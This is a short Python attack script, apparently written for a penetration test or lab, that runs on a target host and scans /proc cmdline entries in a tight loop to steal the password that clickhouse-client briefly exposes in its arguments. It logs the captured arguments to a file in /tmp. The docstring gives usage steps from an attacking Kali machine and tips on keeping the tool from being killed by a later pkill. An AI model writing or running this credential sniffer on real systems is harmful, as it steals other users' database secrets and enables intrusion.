#!/usr/bin/env python3
"""Busy-loop /proc cmdline sniffer (run ON THE TARGET).

hidepid is off, so other UIDs' argv is readable. clickhouse-client copies
--password into argv then blanks it after startup — a `sleep 0.05` loop
misses the secret. This loop has no sleep.

Do not name the file or its invocation so that it matches a later
`pkill -f sniff` of your own SSH session.

Usage:
  python3 proc_sniff.py --needle clickhouse-client --out /tmp/chhit.bin
  # trigger the timer (malformed AIDX) from Kali, then:
  xxd /tmp/chhit.bin | head
"""
from __future__ import annotations

import argparse
import os
import sys
import time


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--needle", default="clickhouse-client")
    ap.add_argument("--out", default="/tmp/chhit.bin")
    ap.add_argument("--seconds", type=float, default=0, help="0 = until Ctrl-C")
    args = ap.parse_args()

    needle = args.needle.encode()
    seen: set[bytes] = set()
    out = open(args.out, "ab", buffering=0)
    print(f"[*] sniff {args.needle!r} → {args.out} (no sleep)", file=sys.stderr)
    deadline = time.time() + args.seconds if args.seconds > 0 else None
    hits = 0
    try:
        while True:
            if deadline is not None and time.time() >= deadline:
                break
            try:
                pids = os.listdir("/proc")
            except OSError:
                continue
            for pid in pids:
                if not pid.isdigit():
                    continue
                try:
                    raw = open(f"/proc/{pid}/cmdline", "rb").read()
                except OSError:
                    continue
                if needle not in raw or raw in seen:
                    continue
                seen.add(raw)
                hits += 1
                stamp = f"{time.time():.3f}".encode()
                out.write(b"T=" + stamp + b" PID=" + pid.encode() + b"\n")
                out.write(raw.replace(b"\x00", b" | ") + b"\n---\n")
                preview = raw.replace(b"\x00", b" | ")[:200]
                print(f"[+] {pid} {preview!r}", file=sys.stderr)
    except KeyboardInterrupt:
        print(file=sys.stderr)
    print(f"[*] hits={hits} file={args.out}", file=sys.stderr)
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
